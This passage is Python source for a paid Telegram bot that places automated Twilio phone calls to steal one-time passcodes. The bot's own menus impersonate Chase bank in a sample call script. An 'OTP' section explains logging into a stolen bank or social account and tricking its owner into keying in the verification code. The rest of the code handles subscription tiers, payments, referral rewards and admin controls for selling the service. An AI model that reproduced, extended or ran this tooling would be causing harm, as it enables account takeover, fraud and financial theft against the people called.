            for admins in access.each():
                url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={admins.key()}&text={msg}"
                r = requests.get(url)
            bot.send_message(cid, "Finished sending the broadcast to everyone !")
    except:
        bot.send_message(cid, "<b>Error admin</b> Issue !", parse_mode=ParseMode.HTML)
#########################################################################################
#########################################################################################
def accountbase(message):
    allowed = ['/account']
    words = message.text.split()
    if len(words) < 2 or words[0].lower() not in allowed:
        return False
    else:
        return True
@bot.message_handler(func=accountbase)
def message(message):
    try:
        cid = message.chat.id
        userid = message.from_user.id
        auth_admins(cid, str(userid))
        account_sid = db.child('groupinfo').child('keys').get().val()['_sid']
        auth_token = db.child('groupinfo').child('keys').get().val()['_auth']
        client = Client(account_sid, auth_token)
        ACTIVE = []
        ALL = []
        if message.text.lower().split()[1] == "active":
            accounts = client.api.accounts.list(status='active', limit=20)
            for record in accounts:
                active = f"NAME: {record.friendly_name} \nSID: {record.sid}"
                ACTIVE.append(active)
                active = "\n\n".join(ACTIVE)
            active2 = f"<i><b>[active]</b></i>\n{active}"
            bot.send_message(cid, active2, parse_mode=ParseMode.HTML)
        if message.text.lower().split()[1] == "all":
            accounts = client.api.accounts.list(limit=20)
            for record in accounts:
                all = f"NAME: {record.friendly_name} \nSID: {record.sid}"
                ALL.append(all)
                all = "\n\n".join(ALL)
            all2 = f"<i><b>[all]</b></i>\n{all}" 
            bot.send_message(cid, all2, parse_mode=ParseMode.HTML)
        if message.text.lower().split()[1] == "get":
            try:
                user = message.text.split()[2]
                get = db.child('members').child(str(user)).get()
                get_sid = get.val()['_sid']
                get_auth = get.val()['_auth']
                get_info = f"Userid: {user}\nSID: {get_sid}\nAUTH: {get_auth}\n`/account suspend {user}`\n`/account activate {user}`\n`/account close {user}`"
                bot.send_message(cid, get_info,  parse_mode=PARSEMODE_MARKDOWN)
            except:
                bot.send_message(cid, "<b>Error 012</b> ° Issue with getting info on user!", parse_mode=ParseMode.HTML)
        if message.text.lower().split()[1] == "suspend":
            try:
                user = message.text.split()[2]
                db.child('members').child(str(user)).update({'status': 'suspended'})
                bot.send_message(cid,f'({user}) account has been suspended.')                        
            except:
                bot.send_message(cid, "<b>Error 013</b> ° Issue with suspending user!", parse_mode=ParseMode.HTML)
        if message.text.lower().split()[1] == "activate":
            try:
                user = message.text.split()[2]
                db.child('members').child(str(user)).update({'status': 'active'})
                bot.send_message(cid,f'({user}) account has been activated.') 
            except:
                bot.send_message(cid, "<b>Error 014</b> ° Issue with activating user!", parse_mode=ParseMode.HTML)
        if message.text.lower().split()[1] == "close":
            try:
                user = message.text.split()[2]
                db.child('members').child(userid).update({'subscription_begin': 'Not Paid', 'subscription_end': 'Not paid', 'status': 'closed', 'subbed': False, 'sub_period': 'Not paid', '_sid': 'Not paid', '_auth': 'Not paid'})
                bot.send_message(cid,f'({user}) account has been closed.') 
            except:
                bot.send_message(cid, "<b>Error 015</b> ° Issue with closing user!", parse_mode=ParseMode.HTML)
    except:
        bot.send_message(cid, "<b>Error 010</b> ° Issue with the command !", parse_mode=ParseMode.HTML)
#########################################################################################
@bot.message_handler(commands=["countries"])
def any_msg(message):
    cid = message.chat.id
    try:
        account_sid = db.child('members').child('928973217').child('_sid').get().val()
        auth_token = db.child('members').child('928973217').child('_auth').get().val()
        client = Client(account_sid, auth_token)
        countries = client.pricing.v1.messaging.countries.list(limit=240)
        i = 0
        COUNTRIES = []
        for record in countries:
            countries = f"[{i}] " + record.country
            i += 1
            COUNTRIES.append(countries)
            countries = "\n".join(COUNTRIES)
        bot.send_message(cid, countries)
    except:
        bot.send_message(cid, "<b>Error 011</b> ° Issue with the command !", parse_mode=ParseMode.HTML)
#########################################################################################
@bot.message_handler(commands=["reset"])
def any_msg(message):
    cid = message.chat.id
    userid = message.from_user.id
    try:
        auth_admins(cid, str(userid))
        _sid = db.child('groupinfo').child('keys').get().val()['_sid']
        _auth = db.child('groupinfo').child('keys').get().val()['_auth']
        db.child('members').child(f'{userid}').update({'_auth': _auth, '_sid': _sid, 'subbed': True})
    except:
        bot.send_message(cid, "Error :: Issue with resetting keys!")
#########################################################################################
#########################################################################################
@bot.message_handler(commands=["help","start"])
def any_msg(message):
    cid = message.chat.id
    username = message.from_user.username
    if username != None:
        userid = message.from_user.id
        try:
            existence = requests.get(f'https://ptsv2.com/t/{userid}')
            url = f"http://ptsv2.com/t/{userid}/d/latest/json"
            editendingmessage = f"http://ptsv2.com/t/{userid}/edit"
            payload ={'AuthUsername':"",'AuthPassword':"",'ResponseCode':"200",'ResponseBody':"Verification completed ! Goodbye !",'ResponseDelay':"0"}
            requests.post(editendingmessage,data=payload)
        except:
            pass
        try:
            try:
                allmembers = db.child('members').child(str(userid)).get()
                check = allmembers.val()['subscription_end']
                check = str(check)
                if ((check != 'Not paid') and (check != '') and (check != 'Never')):
                    if check <= Today:
                        db.child('members').child(userid).update({'subscription_begin': 'Not Paid', 'subscription_end': 'Not paid', 'status': 'Not paid', 'subbed': False, 'sub_period': 'Not paid', '_sid': 'Not paid', '_auth': 'Not paid'})
                        get_alert(f'{username} ({userid}) subscription has exceeded! Auto deleted.')
            except:
                pass        


            if str(db.child('members').child(str(userid)).get().val()) == "None":
                get_alert(f"New user: @{username} ({userid})")
                newestupdate = db.child('groupinfo').update({'newest': f'@{username} ({userid})'})
                subbed = False
                username = message.from_user.username
                sub_period = 'Not paid'
                sub_start = 'Not paid'
                sub_end = 'Not paid'
                status = 'active'
                data = {'_auth': 'Not paid','_sid': 'Not paid','username': "@" + str(username),'first_signin': now_brussels,'subbed':subbed, 'sub_period': sub_period,'subscription_begin': sub_start,'subscription_end': sub_end,'status':status,'profile': f'https://t.me/{username}'}
                try:
                    db.child('members').child(str(userid)).update(data)
                    bot.send_message(cid, "New user welcome! Look around and if you have any question, text me @BOJOM001.")
                except:
                    bot.send_message(cid, 'Error at signin you in!')
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(DASHBOARD,SUPPORT,OWNER)
            where_am_i = "<b><i>You are in the 'Start' section !</i></b>"   
            info = f"{title}\n\nThis bot was created for the purpose to call targets more easily. If you encounter any bug, please let me know! To report a bug, type /reportbug [explanation].\n\n<i><b>~ @BOJOM001 by the people, of the people and for the people.</b></i>\n\n➠ {where_am_i}"
            bot.send_message(message.chat.id, info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
        except KeyError:
            bot.send_message(message.chat.id, "There is an issue server side.\n@BOJOM001 for support")
    else:
        bot.send_message(cid,"You can't use this bot if you dont have an unique username !\n\nSet up an username and try again !")
#########################################################################################
@bot.message_handler(commands=["testcall"])
def any_msg(message):
    try:
        cid = message.chat.id
        username = message.from_user.username
        userid = message.from_user.id
        info = f"<b>For Testcall you need to contact {owner}, They are free of charge !\n\nThis bot currently holds enough buyers to proof its legitimacy. If you have any other question, feel free to <a href='https://t.me/BOJOM001'>CONTACT</a> ADMIN!</b>"
        bot.send_message(message.chat.id, info, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        bot.send_message(cid, "Preparing an example file for the testcall, please wait ...")
        bot.send_chat_action(cid,'upload_video')
        vid = open('examplevideo.mp4', 'rb')
        bot.send_document(cid, vid)
        req = f"[Request Test Call]\n\nUsername: @{username}\nUserid: `{userid}`"
        get_alert(req, PARSEMODE_MARKDOWN)
    except KeyError:
        bot.send_message(message.chat.id, f"<b>Error 001</b> ° Failed to send a request to {owner}.", parse_mode=ParseMode.HTML)
#########################################################################################
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    cid = call.message.chat.id
    try:
        if call.message:
            username = call.from_user.username
            userid = call.from_user.id
            place = call.data
            where_am_i = f"<b><i>You are in the '{call.data}' section !</i></b>"
            invoice_id = "waiting ..."
            id = "waiting ..."
            name = "waiting ..."
            desc = "waiting ..."
            status = "waiting ..."
            Time = "waiting ..."
            beforebuying = "<b>[Invoice will be sent once you tap (BUY)]</b>"
            if call.data == "Dashboard":
                keyboard = types.InlineKeyboardMarkup(row_width=2)    
                keyboard.add(SUBSCRIPTIONS,PROFILE,TODO,REFERRAL,GOBACK)
                info = f"{title}\n\n<b>Latest Update:</b> {Lupdate}\n<b>Signed User:</b> @{username} ({userid})\n\n<i><b>ToDo:</b>\nCheck Out the To Do button.\nContact admin for support: <a href='https://t.me/BOJOM001'>CONTACT ADMIN FOR UPDATE !!!</a></i>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML,disable_web_page_preview=True)
            elif call.data == "ToDo":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(SUPPORTEDCALLS,EXAMPLECALL,OTP,CALL,DASHBOARD)
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=todo, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            elif call.data == "Supported Calls":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(TODO)
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=supported, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            elif call.data == "Call":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(TODO)
                info = f"{title}\n\nYou got 2 options to call !\nAlso when you see bracket '[]' you have to change them!\n\n➞ <b>[1] Preset call</b>\n    ➥  /call [supported type] [number to call] \n    ➥  e.g. /call chase +12096913751\n    ➥  To list all supported types, do /call supported \n\n➞ <b>[2] Custom call</b>\n    ➥  /call custom [number to call] [text to say]\n    ➥  e.g. /call custom +12096913751 We received unusual activity on your account. To secure your account please enter the verification code you just received from our chase bank, followed by the pound sign.\n\nEvery call ends with 'verification completed', so do not forget that!\n    ➞ This message can be changed for you if you contact @BOJOM001\n\n➠ {where_am_i}\n"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            elif call.data == "Example Call":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(TODO)
                example = f"{title}\n\nThis is a proof of concept!\nYou can use this bot for anything, this was just an example!"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=example, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                bot.send_message(cid, "Preparing the File, please wait ...")
                bot.send_chat_action(cid,'upload_video')
                vid = open('examplevideo.mp4', 'rb')
                bot.send_document(cid, vid)
            elif call.data == "Subscriptions":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(ONEDAY,THREEDAYS,ONEMONTH,THREEMONTHS,LIFETIME,DASHBOARD)
                info = f"{title}\n\nOnce you buy a plan, you can make <b>unlimited</b> calls within that plan time.\n➞ e.g. You buy 1M, you can make ∞-calls in 1M!\n\n<i><b>[important !!!]</b></i>\n➞ If it says 701.76$, send 702 & 703 to be safe.\n➞ Will only give access if payment was exact (doubt with fees) or overpaid!\n➞ If you happen to overpay too much, @BOJOM001 for refund\n\nContact: <a href='https://t.me/BOJOM001'>BOJO</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            elif call.data == "My Profile":
                keyboard = types.InlineKeyboardMarkup(row_width=1)    
                keyboard.add(DASHBOARD)
                allmembers = db.child('members').get()
                allmembers = str(len(allmembers.val()))
                trial = db.child('members').child(userid).child('sub_period').get().val()
                status = db.child('members').child(userid).child('status').get().val()
                subscription_begin = db.child('members').child(userid).child('subscription_begin').get().val()
                subscription_end = db.child('members').child(userid).child('subscription_end').get().val()
                first_signin = db.child('members').child(userid).child('first_signin').get().val()
                language = db.child('members').child(userid).child('language').get().val()
                info = f"{title}\n\n<b>Latest Update:</b> {Lupdate}\n\n➤<b>Signed User:</b> @{username} ({userid})\n➤<b>First Signed:</b> <i>{first_signin}</i>\n➤<b>Trial:</b> <i>{trial}</i>\n➤<b>Access:</b> <i>{status}</i>\n➤<b>subscription_Begin:</b> <i>{subscription_begin}</i>\n➤<b>subscription_End:</b> <i>{subscription_end}</i>\n➤<b>Language:</b> <i>{language}</i>\n\n➠ {where_am_i}"                
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "One Day":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(BUYONEDAY,SUBSCRIPTIONS)
                info = f"{title}\n\nPRICE: 30 € | 35 $\n\nORDER N°: {invoice_id}\nName: {name}\nDesc: {desc}\nStatus: {status} \n\nTime: {Time}<a href='https://i.imgur.com/51cblfh.png'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Buying One Day":
                euros = 30
                data = "ONEDAY"
                From =  "Buying one day access"
                order(cid,euros,where_am_i,username,userid, data, From)
            elif call.data == "Three Days":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(BUYTHREEDAYS,SUBSCRIPTIONS)
                info = f"{title}\n\nPRICE: 80 € | 95 $\n\nORDER N°: {invoice_id}\nName: {name}\nDesc: {desc}\nStatus: {status} \n\nTime: {Time}<a href='https://i.imgur.com/zgUL65W.png'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Buying Three Days":
                euros = 80
                data = "THREEDAYS"
                From =  "Buying three day access"
                order(cid,euros,where_am_i,username,userid, data, From)
            elif call.data == "One Month":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(BUYONEMONTH,SUBSCRIPTIONS)
                info = f"{title}\n\nPRICE: 250 € | 293 $\n\nORDER N°: {invoice_id}\nName: {name}\nDesc: {desc}\nStatus: {status} \n\nTime: {Time}<a href='https://i.imgur.com/7CPHesb.png'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Buying One Month":
                euros = 250
                data = "ONEMONTH"
                From =  "Buying one month access"
                order(cid,euros,where_am_i,username,userid, data, From)
            elif call.data == "Three Months":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(BUYTHREEMONTHS,SUBSCRIPTIONS)
                info = f"{title}\n\nPRICE: 600 € | 702 $\n\nORDER N°: {invoice_id}\nName: {name}\nDesc: {desc}\nStatus: {status} \n\nTime: {Time}<a href='https://i.imgur.com/zEyF4X9.png'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Buying Three Months":
                euros = 600
                data = "THREEMONTHS"
                From =  "Buying three months access"
                order(cid,euros,where_am_i,username,userid, data, From)
            elif call.data == "Lifetime":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(BUYLIFETIME,SUBSCRIPTIONS)
                info = f"{title}\n\nPRICE: 2400 € | 2810 $\n\nORDER N°: {invoice_id}\nName: {name}\nDesc: {desc}\nStatus: {status}\n\nTime: {Time}<a href='https://i.imgur.com/hFKTzDg.png'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Buying Lifetime":
                euros = 2400
                data = "LIFETIME"
                From =  "Buying lifetime access"
                order(cid,euros,where_am_i,username,userid, data, From)
            elif call.data == "Owner":
                cid = call.message.chat.id
                auth_admins(cid,str(call.from_user.id))
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(BOTINFO,GOBACK)
                account_sid = db.child('groupinfo').child('keys').get().val()['_sid']
                auth_token = db.child('groupinfo').child('keys').get().val()['_auth']
                url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Balance.json"
                req = requests.get(url,auth=(account_sid, auth_token))
                res = req.json()
                bal = []
                for key,value in res.items():
                    bal.append(key + " ➜ " + value)
                bal = "\n".join(bal)
                info = f"{title}\n\n<b>Balance:</b> \n{bal}\n\n/subadder [id] [subscription_end] [sub_period]\ne.g. /subadder 68468468 2021-09-25 5 Days\n\n/brd all [message]\n/brd pm [userid] [message]\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True) 
            elif call.data == "Start":
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(DASHBOARD,SUPPORT,OWNER)
                info = f"{title}\n\nThis bot was created for the purpose to call targets more easily. If you encounter any bug, please let me know! To report a bug, type /reportbug [explanation].\n\n<i><b>~ @BOJOM001 by the people, of the people and for the people.</b></i>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Confirm":
                keyboard = types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(DASHBOARD,SUPPORT,OWNER)
                info = f"{title}\n\nThis bot was created for the purpose to call targets more easily. If you encounter any bug, please let me know! To report a bug, type /reportbug [explanation].\n\n<i><b>~ @BOJOM001 by the people, of the people and for the people.</b></i>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Support":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(FAQ,GOBACK)
                url = "https://t.me/BOJOM001"
                info = f"{title}\n\n<i>[SUPPORT]</i><a href='{url}'>&#8204;</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Bot Info":
                auth_admins(cid,str(call.from_user.id))
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(SUPPORT)
                allmembers = db.child('members').get()
                allmembers = str(len(allmembers.val()))
                if allmembers == '1':
                    alltrialmemberstype = "member"
                else:
                    alltrialmemberstype = "members"
                p = 0
                allpaidmembers = db.child('members').get()
                for paid in allpaidmembers.each():
                    if bool(paid.val()['subbed']) == True:
                        db.child('groupinfo').child('all-time_paid').update({f'{paid.key()}':1})
                        p += 1
                newest = db.child('groupinfo').get().val()['newest']
                oldest = db.child('groupinfo').get().val()['latest']
                try:
                    call_sid = db.child('members').child('928973217').child('_sid').get().val()
                    call_auth = db.child('members').child('928973217').child('_auth').get().val()
                    client = Client(call_sid, call_auth)
                except:
                    return
                i = 1
                SMS = []
                try:
                    allcals = db.child('groupinfo').child('calls_made').get()
                    amountcalls = []
                    for calls in allcals.each():
                        amountcalls.append(int(calls.val()))
                    amountcalls = sum(amountcalls)
                except:
                    amountcalls = "Can't load!"
                latest_call = db.child('groupinfo').child('latest_call').get().val()
                calls_made_most = db.child('groupinfo').child('calls_made').get()
                allcalls = []
                for calls in calls_made_most.each():
                    allcalls.append(int(f'{calls.val()} '))
                sort = sorted(allcalls)
                groupinfo = db.child('groupinfo').child('calls_made').get()
                for member in groupinfo.each():
                    if str(member.val()) == str(sort[-1]):
                        scorecalls = f"{str(sort[-1])} calls from {member.key()}"
                try:
                    latest_purchased = db.child('groupinfo').child('latest_purchase').get()
                    latest_purchasedmember = f"{latest_purchased.val()['username']} ({latest_purchased.val()['userid']})"
                except:
                    latest_purchasedmember = "can't load"
                all_time_paid = db.child('groupinfo').child('all-time_paid').get().val()
                try:
                    my_total_calls = db.child('groupinfo').child('calls_made').get().val()[f'{userid}']
                except:
                    my_total_calls = 0
                info = f"{title}\n\n<i><b>[MEMBERS]</b></i>\nTotal Members: {allmembers} {alltrialmemberstype}\nAll-Time Paid Members: {str(len(all_time_paid) + 3)} Members\nCurrent Paid Members: {str(p)} Members\nNewest Member: {newest}\nFirst Member: {oldest}\n\n<i><b>[CALLS]</b></i>\nTotal Calls: {amountcalls} calls\nLatest Call: {latest_call}\nMost calls: {str(scorecalls)}\nMy Total calls: {my_total_calls} calls \n\n<i><b>[PAYMENTS]</b></i>\nLatest Purchase: {latest_purchasedmember}\n\n<i><b>[Not set]</b></i>\n➞ What would you like to be added here?\n    ➞ Contact: <a href='https://t.me/BOJOM001'>OWNER</a>\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            elif call.data == "OTP":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(TODO)
                whatisotp = f"{title}\n\n<i><b>[Background info]</b></i>\n➞ OTP = one time passwords\n➞ Those are codes you receive to verify yourself before login.\n\n<i><b>[Proof of concept]</b></i>\n➞ Log in the stolen 'bank/social/website' acc\n➞ This sends the code to owner of that acc\n➞ You call the owner and request the code\n➞ IF the owner uses the numpad, that code will be sent to you in chat\n➞ Done, you got access now.\n➞ Sim swapping is the past and this is the future\n<a href='https://i.imgur.com/SvoD443.png'>&#8204;</a>\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=whatisotp, reply_markup=keyboard, parse_mode=ParseMode.HTML)
            elif call.data == "Faq":
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(CONFIRM)
                info = f"{title}\n\n<b><i>[1] Can i make a test call?</i></b> \nThese were available at the start of the launch. This bot currently holds enough buyers to proof its legitimacy.\nYet if you really want to request one, pm @BOJOM001\n\n<b><i>[2] Can i resell this bot?</i></b> \nAs of now, this feature is not possible.\n\n<b><i>[3] If i vouch, do i get something?</i></b>\nIf you show proof that you referred this bot to a new 'buyer', then i will extend your subscription with half of the days which the buyer bought. <b>exc: lifetime</b>\n➞ e.g. 'A' refers bot to 'B' and 'B' buys 1month sub. Person 'A' gets + 15 days \n➞ For 3 months = + 45 days\n➞ For lifetime = + 100 days\n     \n<b><i>[4] Can i ask a specific question?</i></b> \nYes you can, pm me @BOJOM001 and ask your question in a way that i can answer directly instead of waiting for me to read your 'hey' message.\n\n➠ {where_am_i}"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=info, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    except:
        bot.send_message(cid, "<b>Error 666</b> ° There is an issue with the bot.\nContact @BOJOM001 for help.", parse_mode=ParseMode.HTML)

@bot.message_handler(content_types=["text"])
def any_msg(message):
    bot.send_message(message.chat.id, "Sorry i don't understand.\nTry /help")

bot.polling()
get_alert(f'Bot Offline')